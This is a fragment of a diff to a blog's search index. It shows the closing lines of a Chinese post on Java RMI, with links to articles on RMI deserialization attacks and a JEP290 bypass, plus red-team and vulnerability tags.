+<p>这样就表示运行成功了。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><blockquote>
+<p>因作者能力有限，rmi攻击可以查看下面的文章：</p>
+<p><a href="https://xz.aliyun.com/t/8706">JAVA RMI 反序列化攻击 &amp; JEP290 Bypass分析 - 先知社区 (aliyun.com)</a></p>
+</blockquote>
+<blockquote>
+<p>本文参考文章：</p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>stcs</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>红队</tag>
+        <tag>Java漏洞</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+</search>
